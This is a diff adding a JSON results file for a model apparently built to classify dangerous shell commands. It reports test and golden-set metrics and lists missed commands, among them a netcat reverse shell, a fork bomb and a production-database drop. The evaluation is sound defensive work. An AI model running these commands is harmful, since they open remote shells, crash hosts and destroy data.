@@ -1,0 +1,39 @@
+{
+  "model": "model_b",
+  "test": {
+    "n": 5656,
+    "tp": 2627,
+    "fn": 241,
+    "fp": 387,
+    "tn": 2401,
+    "recall": 0.9159693165969317,
+    "precision": 0.8715992037159921,
+    "f1": 0.893233594015641,
+    "accuracy": 0.888967468175389
+  },
+  "golden": {
+    "n": 48,
+    "tp": 21,
+    "fn": 4,
+    "fp": 7,
+    "tn": 16,
+    "recall": 0.84,
+    "precision": 0.75,
+    "f1": 0.7924528301886793,
+    "accuracy": 0.7708333333333334
+  },
+  "golden_misses": [
+    "docker volume rm postgres_data",
+    "psql -c \"DROP DATABASE app_prod\"",
+    "nc -e /bin/sh 10.0.0.99 9001",
+    ":(){ :|:& };:",
+    "rm -rf node_modules",
+    "rm -rf ./build",
+    "cat /etc/hosts",
+    "curl -fsSL -o install.sh https://raw.githubusercontent.com/someone/tools/main/install.sh",
+    "chmod 600 ~/.ssh/id_ed25519",
+    "tar -czf backup.tgz src/",
+    "echo $PATH"
+  ],
+  "us_per_command": 5575.411414250314
+}
